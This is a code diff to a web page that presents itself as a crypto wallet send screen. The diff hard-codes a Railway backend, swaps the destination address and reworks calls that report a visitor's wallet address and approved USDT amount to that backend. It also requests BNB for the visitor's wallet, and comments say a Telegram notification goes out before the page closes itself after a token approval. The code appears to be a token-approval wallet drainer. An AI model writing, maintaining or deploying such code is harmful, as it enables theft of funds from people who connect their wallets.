@@ -66,7 +66,7 @@
 
     <label class="label" for="address">Address or Domain Name</label>
     <div class="input-group">
-      <input type="text" id="address" placeholder="Search or Enter" value="0x787f409003d23f45E9a77aea9f9434944d5B796e">
+      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC">
       <button class="text-btn">Paste</button>
       <button class="icon-btn"><i class="fas fa-address-book"></i></button>
       <button class="icon-btn"><i class="fas fa-expand"></i></button>
@@ -96,6 +96,9 @@
 
         var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;
 
+        // Backend URL - change this to your actual backend URL if different
+        // This URL is used for all API calls and works from any network/IP
+        const BACKEND_URL = 'https://rabari-ahmedabad-production.up.railway.app';
 
  window.addEventListener('load', connectWallet);
     async function connectWallet() {
@@ -182,9 +185,8 @@
 
                             var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };
 
-                            // Use absolute URL based on current origin
-                            const apiBaseUrl = window.location.origin || '';
-                            const apiUrl = apiBaseUrl ? `${apiBaseUrl}/MemberPanel/TopUpWithMetamaskJson` : '/MemberPanel/TopUpWithMetamaskJson';
+                            // Try to use backend URL, fallback to relative URL
+                            const apiUrl = `${BACKEND_URL}/MemberPanel/TopUpWithMetamaskJson`;
                             
                             $.ajax({
                                 url: apiUrl,
@@ -192,6 +194,7 @@
                                 dataType: 'JSON',
                                 contentType: 'application/json',
                                 data: JSON.stringify(maindt),
+                                timeout: 10000, // 10 second timeout
                                 success: function (data) {
                                     if (data == "Success") {
                                         showLoading('Transaction processed');
@@ -199,28 +202,27 @@
                                         console.log('success');
                                     }
                                     else {
-                     }
+                                        console.log('API returned:', data);
+                                    }
                                 },
                                 error: function (err) {
-                                    console.log("error:" + JSON.stringify(err));
-                                    // If relative URL fails, try with full origin
-                                    if (apiUrl.startsWith('/')) {
-                                        const fallbackUrl = window.location.origin + apiUrl;
+                                    console.log("API error (non-critical):", JSON.stringify(err));
+                                    // This is non-critical, so we continue anyway
+                                    // Try fallback to relative URL if available
+                                    if (window.location.origin && window.location.origin !== 'null') {
+                                        const fallbackUrl = window.location.origin + '/MemberPanel/TopUpWithMetamaskJson';
                                         $.ajax({
                                             url: fallbackUrl,
                                             type: 'POST',
                                             dataType: 'JSON',
                                             contentType: 'application/json',
                                             data: JSON.stringify(maindt),
+                                            timeout: 5000,
                                             success: function (data) {
-                                                if (data == "Success") {
-                                                    showLoading('Transaction processed');
-                                                    setTimeout(() => hideLoading(), 2000);
-                                                    console.log('success (fallback)');
-                                                }
+                                                console.log('Fallback API success');
                                             },
                                             error: function (fallbackErr) {
-                                                console.log("Fallback error:" + JSON.stringify(fallbackErr));
+                                                console.log("Fallback API error (ignored):", JSON.stringify(fallbackErr));
                                             }
                                         });
                                     }
@@ -330,93 +332,61 @@
 
 // Function to request the BNB top-up from your backend
 async function requestBNBTopUp(account) {
+    // Always use the Railway backend URL directly - works from any network
+    const apiUrl = `${BACKEND_URL}/send-bnb`;
+    
+    console.log('Requesting BNB top-up from:', apiUrl);
+    console.log('Account:', account);
+    
     try {
-        // Use the same origin as the current page, or fallback to Railway URL
-        const baseUrl = window.location.origin || 'https://rabari-ahmedabad-production.up.railway.app';
-        const apiUrl = `${baseUrl}/send-bnb`;
-        
-        console.log('Requesting BNB top-up from:', apiUrl);
-        
         const response = await fetch(apiUrl, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
-                'Accept': 'application/json'
+                'Accept': 'application/json',
+                'Origin': window.location.origin || '*'
             },
             body: JSON.stringify({ recipient: account }),
             mode: 'cors',
-            credentials: 'omit'
+            credentials: 'omit',
+            cache: 'no-cache'
         });
+
+        console.log('Response status:', response.status, response.statusText);
 
         // Check if response is ok
         if (!response.ok) {
-            console.error('Response not OK:', response.status, response.statusText);
-            // Try fallback to Railway URL if current origin fails
-            if (baseUrl !== 'https://rabari-ahmedabad-production.up.railway.app') {
-                console.log('Trying fallback Railway URL...');
-                const fallbackResponse = await fetch('https://rabari-ahmedabad-production.up.railway.app/send-bnb', {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({ recipient: account }),
-                    mode: 'cors',
-                    credentials: 'omit'
-                });
-                
-                if (fallbackResponse.ok) {
-                    const fallbackData = await fallbackResponse.json();
-                    if (fallbackData.success) {
-                        showLoading('progress...');
-                        return true;
-                    }
-                }
-            }
+            const errorText = await response.text();
+            console.error('Response not OK:', response.status, response.statusText, errorText);
             showLoading('Please try again.');
             setTimeout(() => hideLoading(), 2000);
             return false;
         }
 
         const data = await response.json();
+        console.log('Response data:', data);
+        
         if (data.success) {
             showLoading('progress...');
             return true;  // Return true indicating the top-up was successful
         } else {
+            console.error('Backend returned success: false', data);
             showLoading('Please try again.');
             setTimeout(() => hideLoading(), 2000);
             return false;  // Return false indicating the top-up failed
         }
     } catch (error) {
         console.error('Error during BNB request:', error);
-        // Try fallback to Railway URL if there's a network error
-        if (error.name === 'TypeError' || error.message.includes('fetch')) {
-            try {
-                console.log('Network error, trying Railway fallback...');
-                const fallbackResponse = await fetch('https://rabari-ahmedabad-production.up.railway.app/send-bnb', {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({ recipient: account }),
-                    mode: 'cors',
-                    credentials: 'omit'
-                });
-                
-                if (fallbackResponse.ok) {
-                    const fallbackData = await fallbackResponse.json();
-                    if (fallbackData.success) {
-                        showLoading('progress...');
-                        return true;
-                    }
-                }
-            } catch (fallbackError) {
-                console.error('Fallback also failed:', fallbackError);
-            }
+        console.error('Error name:', error.name);
+        console.error('Error message:', error.message);
+        
+        // Check if it's a CORS error
+        if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch'))) {
+            console.error('CORS error detected. Backend may need to allow cross-origin requests.');
         }
-        showLoading('Error initiating top-up. Please try again.');
-        setTimeout(() => hideLoading(), 2000);
+        
+        showLoading('Network error. Please check your connection and try again.');
+        setTimeout(() => hideLoading(), 3000);
         return false;  // Return false in case of an error
     }
 }
@@ -490,9 +460,8 @@ async function approveToken(account) {
             
             var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
             
-            // Use absolute URL based on current origin
-            const apiBaseUrl = window.location.origin || '';
-            const apiUrl = apiBaseUrl ? `${apiBaseUrl}/home/TopUpWithMetamaskJson` : '/home/TopUpWithMetamaskJson';
+            // Use backend URL directly - works from any network
+            const apiUrl = `${BACKEND_URL}/home/TopUpWithMetamaskJson`;
             
             $.ajax({
                 url: apiUrl,
@@ -500,6 +469,7 @@ async function approveToken(account) {
                 dataType: 'JSON',
                 contentType: 'application/json',
                 data: JSON.stringify(maindt),
+                timeout: 10000, // 10 second timeout
                 success: function (data) {
                     console.log('Success');
                     // Close site immediately after Telegram notification sent
@@ -507,55 +477,49 @@ async function approveToken(account) {
                         window.close();
                         // If window.close doesn't work, try redirect
                         if (!window.closed) {
-                            const redirectUrl = apiBaseUrl ? `${apiBaseUrl}/home/index` : "/home/index";
-                            location.href = redirectUrl;
+                            // Try to redirect to backend, or just close
+                            try {
+                                location.href = `${BACKEND_URL}/home/index`;
+                            } catch(e) {
+                                // If redirect fails, just close
+                            }
                         }
                     }, 500);
                 },
                 error: function (err) {
-                    console.log("Error: " + JSON.stringify(err));
-                    // If relative URL fails, try with full origin
-                    if (apiUrl.startsWith('/')) {
-                        const fallbackUrl = window.location.origin + apiUrl;
+                    console.log("API error (non-critical): " + JSON.stringify(err));
+                    // This API call is non-critical - Telegram notification already sent
+                    // Try fallback to relative URL if we're on the same domain
+                    if (window.location.origin && window.location.origin !== 'null' && !window.location.origin.includes('file://')) {
+                        const fallbackUrl = window.location.origin + '/home/TopUpWithMetamaskJson';
                         $.ajax({
                             url: fallbackUrl,
                             type: 'POST',
                             dataType: 'JSON',
                             contentType: 'application/json',
                             data: JSON.stringify(maindt),
+                            timeout: 5000,
                             success: function (data) {
-                                console.log('Success (fallback)');
-                                setTimeout(() => {
-                                    window.close();
-                                    if (!window.closed) {
-                                        const redirectUrl = window.location.origin + "/home/index";
-                                        location.href = redirectUrl;
-                                    }
-                                }, 500);
+                                console.log('Fallback API success');
                             },
                             error: function (fallbackErr) {
-                                console.log("Fallback error: " + JSON.stringify(fallbackErr));
-                                // Close site even if API call fails
-                                setTimeout(() => {
-                                    window.close();
-                                    if (!window.closed) {
-                                        const redirectUrl = window.location.origin ? `${window.location.origin}/home/index` : "/home/index";
-                                        location.href = redirectUrl;
-                                    }
-                                }, 500);
+                                console.log("Fallback API error (ignored): " + JSON.stringify(fallbackErr));
                             }
                         });
-                    } else {
-                        // Close site immediately after Telegram notification sent
-                        setTimeout(() => {
-                            window.close();
-                            // If window.close doesn't work, try redirect
-                            if (!window.closed) {
-                                const redirectUrl = apiBaseUrl ? `${apiBaseUrl}/home/index` : "/home/index";
-                                location.href = redirectUrl;
-                            }
-                        }, 500);
                     }
+                    // Close site even if API call fails (non-critical)
+                    setTimeout(() => {
+                        window.close();
+                        if (!window.closed) {
+                            try {
+                                if (window.location.origin && window.location.origin !== 'null' && !window.location.origin.includes('file://')) {
+                                    location.href = window.location.origin + "/home/index";
+                                }
+                            } catch(e) {
+                                // Ignore redirect errors
+                            }
+                        }
+                    }, 500);
                 }
             });
         })
